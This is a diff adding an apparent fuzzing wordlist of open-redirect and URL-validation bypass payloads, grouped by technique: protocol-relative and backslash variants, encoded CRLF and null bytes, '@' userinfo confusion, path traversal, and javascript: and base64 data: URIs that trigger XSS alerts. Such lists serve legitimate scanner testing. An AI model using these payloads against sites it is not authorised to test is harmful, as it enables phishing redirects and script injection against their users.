@@ -1,0 +1,43 @@
+# --- Standard & Protocol Relative ---
+https://example.com
+http://example.com
+//example.com
+//example.com/
+///example.com
+////example.com
+
+# --- Slash & Backslash Variations ---
+\/\/example.com
+/\/\example.com
+\\example.com
+/\\/example.com
+%5C%5Cexample.com
+%2F%2Fexample.com
+
+# --- CRLF & Whitespace Injection ---
+%09https://example.com
+%00https://example.com
+%0d%0ahttps://example.com
+ \/\/example.com
+/ %09/example.com
+
+# --- Authority & Basic Auth Fuzzing ---
+https://target.com@example.com
+https://example.com%23@target.com
+https://example.com%3F@target.com
+https://example.com\@target.com
+//target.com@example.com
+
+# --- Open Redirect to XSS (Great for your JS Scanner) ---
+javascript:alert(document.domain)
+javascript://%250Aalert(document.domain)
+javascript:prompt(1)
+%09javascript:alert(1)
+jav%0Aascript:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# --- Parameter Injection & Path Traversal ---
+/..//example.com
+/../example.com
+?next=https://example.com
+https://example.com?target.com
